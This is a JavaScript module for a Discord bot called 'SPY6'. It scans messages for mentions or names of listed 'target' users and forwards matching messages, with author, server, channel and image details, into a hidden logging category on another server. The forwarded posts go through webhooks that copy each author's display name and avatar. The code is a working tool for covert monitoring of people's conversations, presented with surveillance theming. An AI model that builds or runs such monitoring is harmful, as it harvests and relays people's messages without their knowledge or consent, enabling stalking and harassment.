const {
  ChannelType,
  PermissionFlagsBits,
  WebhookClient,
  EmbedBuilder
} = require('discord.js');
const { CYAN } = require('./theme');

const TARGET_ALLOW = [
  PermissionFlagsBits.ViewChannel,
  PermissionFlagsBits.ReadMessageHistory
];

const TARGET_DENY = [
  PermissionFlagsBits.SendMessages,
  PermissionFlagsBits.SendMessagesInThreads,
  PermissionFlagsBits.CreatePublicThreads,
  PermissionFlagsBits.CreatePrivateThreads,
  PermissionFlagsBits.AddReactions,
  PermissionFlagsBits.ManageMessages,
  PermissionFlagsBits.ManageWebhooks,
  PermissionFlagsBits.ManageChannels
];

const OWNER_ALLOW = [
  PermissionFlagsBits.ViewChannel,
  PermissionFlagsBits.ReadMessageHistory,
  PermissionFlagsBits.SendMessages,
  PermissionFlagsBits.SendMessagesInThreads,
  PermissionFlagsBits.EmbedLinks,
  PermissionFlagsBits.AttachFiles,
  PermissionFlagsBits.ManageMessages,
  PermissionFlagsBits.ManageWebhooks,
  PermissionFlagsBits.ManageChannels
];

function envOwnerIds() {
  return String(process.env.OWNER_IDS || '')
    .split(',')
    .map(v => v.trim())
    .filter(v => /^\d{15,22}$/.test(v));
}

function allOwnerIds(state) {
  return [...new Set([...envOwnerIds(), ...(state.owners || [])])];
}

function sanitizeChannelName(name, userId) {
  const safe = String(name || 'user')
    .toLowerCase()
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .replace(/[^a-z0-9-_]/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-|-$/g, '')
    .slice(0, 60);
  return `target-${safe || 'unknown'}-${String(userId).slice(-6)}`.slice(0, 100);
}

async function fetchUserFromClients(clients, userId) {
  for (const record of clients) {
    if (!record.client?.isReady()) continue;
    try {
      return await record.client.users.fetch(userId, { force: true });
    } catch (_) {}
  }
  return null;
}

async function deleteOldSetup(clients, state) {
  if (!state.setupGuildId) return;

  for (const record of clients) {
    if (!record.client?.isReady()) continue;
    const guild = record.client.guilds.cache.get(state.setupGuildId);
    if (!guild) continue;

    try {
      if (state.categoryId) {
        const category = guild.channels.cache.get(state.categoryId) || await guild.channels.fetch(state.categoryId).catch(() => null);
        if (category) {
          const children = guild.channels.cache.filter(ch => ch.parentId === category.id);
          for (const child of children.values()) {
            await child.delete('SPY6 /spysetup déplacé vers un autre serveur').catch(() => null);
          }
          await category.delete('SPY6 /spysetup déplacé vers un autre serveur').catch(() => null);
        }
      }
    } catch (err) {
      console.error('⚠️ Nettoyage ancien setup :', err.message);
    }
    break;
  }

  state.categoryId = null;
  for (const target of state.targets) {
    target.channelId = null;
    target.webhookId = null;
    target.webhookToken = null;
  }
}

async function grantOwnerAccess(guild, state, userId, enabled = true) {
  if (!guild || !state.categoryId) return;
  const category = guild.channels.cache.get(state.categoryId)
    || await guild.channels.fetch(state.categoryId).catch(() => null);
  if (!category) return;

  if (enabled) {
    await category.permissionOverwrites.edit(userId, { ViewChannel: true, ReadMessageHistory: true, SendMessages: true, SendMessagesInThreads: true, EmbedLinks: true, AttachFiles: true, ManageMessages: true, ManageWebhooks: true, ManageChannels: true });
  } else {
    await category.permissionOverwrites.delete(userId).catch(() => null);
  }

  const children = guild.channels.cache.filter(ch => ch.parentId === category.id);
  for (const channel of children.values()) {
    if (enabled) {
      await channel.permissionOverwrites.edit(userId, { ViewChannel: true, ReadMessageHistory: true, SendMessages: true, SendMessagesInThreads: true, EmbedLinks: true, AttachFiles: true, ManageMessages: true, ManageWebhooks: true, ManageChannels: true }).catch(() => null);
    } else {
      await channel.permissionOverwrites.delete(userId).catch(() => null);
    }
  }
}

async function grantTargetReadAccess(guild, target) {
  if (!guild || !target?.channelId) return false;

  const member = guild.members.cache.get(target.userId)
    || await guild.members.fetch(target.userId).catch(() => null);
  if (!member) return false;

  const channel = guild.channels.cache.get(target.channelId)
    || await guild.channels.fetch(target.channelId).catch(() => null);
  if (!channel) return false;

  await channel.permissionOverwrites.edit(target.userId, {
    ViewChannel: true,
    ReadMessageHistory: true,
    SendMessages: false,
    SendMessagesInThreads: false,
    CreatePublicThreads: false,
    CreatePrivateThreads: false,
    AddReactions: false,
    ManageMessages: false,
    ManageWebhooks: false,
    ManageChannels: false
  });
  return true;
}

async function syncTargetReadAccess(guild, state) {
  for (const target of state.targets) {
    await grantTargetReadAccess(guild, target).catch(() => null);
  }
}

async function ensureTargetChannel(guild, categoryId, target, botUserId) {
  let channel = target.channelId
    ? (guild.channels.cache.get(target.channelId) || await guild.channels.fetch(target.channelId).catch(() => null))
    : null;

  if (!channel) {
    const display = target.globalName || target.username || target.userId;
    channel = await guild.channels.create({
      name: sanitizeChannelName(display, target.userId),
      type: ChannelType.GuildText,
      parent: categoryId,
      topic: `SPY6 // CLASSIFIED TARGET • ${display} • UID ${target.userId}`,
      reason: `SPY6 surveillance de ${target.userId}`
    });
    target.channelId = channel.id;
  }

  await grantTargetReadAccess(guild, target).catch(() => null);

  let webhook = null;
  if (target.webhookId && target.webhookToken) {
    try {
      const client = new WebhookClient({ id: target.webhookId, token: target.webhookToken });
      await client.fetch();
      webhook = client;
    } catch (_) {
      webhook = null;
    }
  }

  if (!webhook) {
    const hooks = await channel.fetchWebhooks();
    let hook = hooks.find(h => h.owner?.id === botUserId && h.name === 'SPY6 // INTERCEPT');
    if (!hook) {
      hook = await channel.createWebhook({
        name: 'SPY6 // INTERCEPT',
        reason: `SPY6 logs pour ${target.userId}`
      });
    }
    target.webhookId = hook.id;
    target.webhookToken = hook.token;
    webhook = hook;
  }

  return { channel, webhook };
}

async function setupGuild({ guild, state, clients, saveState, activeClient }) {
  if (state.setupGuildId && state.setupGuildId !== guild.id) {
    await deleteOldSetup(clients, state);
  } else if (state.categoryId) {
    const oldCategory = guild.channels.cache.get(state.categoryId) || await guild.channels.fetch(state.categoryId).catch(() => null);
    if (oldCategory) {
      const children = guild.channels.cache.filter(ch => ch.parentId === oldCategory.id);
      for (const child of children.values()) await child.delete('Recréation SPY6 LOGS').catch(() => null);
      await oldCategory.delete('Recréation SPY6 LOGS').catch(() => null);
    }
  }

  const everyoneId = guild.roles.everyone.id;
  const botIds = [...new Set(
    clients
      .filter(r => r.client?.isReady() && r.client.guilds.cache.has(guild.id))
      .map(r => r.client.user.id)
  )];

  const botAllows = [
    PermissionFlagsBits.ViewChannel,
    PermissionFlagsBits.SendMessages,
    PermissionFlagsBits.EmbedLinks,
    PermissionFlagsBits.ManageWebhooks,
    PermissionFlagsBits.ManageChannels
  ];

  const ownerIds = allOwnerIds(state);

  const category = await guild.channels.create({
    name: process.env.LOG_CATEGORY_NAME || '⌬ SPY6・BLACKSITE',
    type: ChannelType.GuildCategory,
    permissionOverwrites: [
      { id: everyoneId, deny: [PermissionFlagsBits.ViewChannel] },
      ...botIds.map(id => ({ id, allow: botAllows })),
      ...ownerIds.map(id => ({ id, allow: OWNER_ALLOW }))
    ],
    reason: 'SPY6 /spysetup'
  });

  state.setupGuildId = guild.id;
  state.categoryId = category.id;
  for (const target of state.targets) {
    target.channelId = null;
    target.webhookId = null;
    target.webhookToken = null;
    await ensureTargetChannel(guild, category.id, target, activeClient.user.id);
  }

  await syncTargetReadAccess(guild, state);
  saveState(state);
  return category;
}

function targetMatchesMessage(target, message) {
  if (message.mentions?.users?.has(target.userId)) return true;

  const content = String(message.content || '').toLocaleLowerCase('fr-FR');
  if (!content) return false;

  const names = [target.username, target.globalName]
    .filter(Boolean)
    .map(v => String(v).trim().toLocaleLowerCase('fr-FR'))
    .filter(v => v.length >= 3);

  return names.some(name => content.includes(name));
}

async function sendTargetLog({ message, target, state, clients, saveState, activeClient }) {
  if (!state.setupGuildId || !state.categoryId) return;
  const logGuild = activeClient.guilds.cache.get(state.setupGuildId)
    || await activeClient.guilds.fetch(state.setupGuildId).catch(() => null);
  if (!logGuild) return;

  const { webhook } = await ensureTargetChannel(logGuild, state.categoryId, target, activeClient.user.id);
  saveState(state);

  const jump = `https://discord.com/channels/${message.guild.id}/${message.channel.id}/${message.id}`;
  const authorAvatar = message.author.displayAvatarURL({ size: 512 });
  const serverIcon = message.guild.iconURL({ size: 256 });
  const authorName = (message.member?.displayName || message.author.globalName || message.author.username || 'UNKNOWN').slice(0, 80);
  const targetName = target.globalName || target.username || target.userId;
  const intercepted = (message.content || '*TRANSMISSION WITHOUT TEXT*').slice(0, 4096);

  const embed = new EmbedBuilder()
    .setColor(CYAN)
    .setAuthor({
      name: 'SPY6 // INTERCEPTED TRANSMISSION',
      iconURL: serverIcon || activeClient.user.displayAvatarURL({ size: 256 })
    })
    .setTitle(`⌬ TARGET ACQUIRED // ${targetName}`)
    .setDescription(`\`\`\`text\n${intercepted.replace(/```/g, 'ʼʼʼ')}\n\`\`\``)
    .addFields(
      { name: 'OPERATIVE / SOURCE', value: `${message.author} • \`${message.author.id}\``, inline: true },
      { name: 'TARGET', value: `<@${target.userId}> • \`${target.userId}\``, inline: true },
      { name: 'ORIGIN NODE', value: `${message.guild.name}\n\`${message.guild.id}\``, inline: true },
      { name: 'CHANNEL TRACE', value: `${message.channel} • \`${message.channel.id}\``, inline: true },
      { name: 'SOURCE LINK', value: `[OPEN TRANSMISSION](${jump})`, inline: true },
      { name: 'CLASSIFICATION', value: '`RESTRICTED // EYES ONLY`', inline: true }
    )
    .setThumbnail(authorAvatar)
    .setFooter({ text: 'SPY6 // INTELLIGENCE NETWORK • TRACE COMPLETE' })
    .setTimestamp(message.createdAt);

  const firstImage = message.attachments.find(a => a.contentType?.startsWith('image/'));
  if (firstImage) embed.setImage(firstImage.url);

  // Le webhook reprend volontairement l'identité visuelle de l'auteur de la
  // transmission : pseudo du serveur + avatar Discord. Discord affiche tout
  // de même l'indication "BOT/Webhook", ce qui évite de le faire passer pour
  // le vrai compte.
  await webhook.send({
    username: authorName,
    avatarURL: authorAvatar,
    embeds: [embed],
    allowedMentions: { parse: [] }
  });
}
module.exports = {
  fetchUserFromClients,
  deleteOldSetup,
  ensureTargetChannel,
  setupGuild,
  targetMatchesMessage,
  sendTargetLog,
  sanitizeChannelName,
  grantTargetReadAccess,
  syncTargetReadAccess,
  grantOwnerAccess,
  allOwnerIds,
  envOwnerIds
};
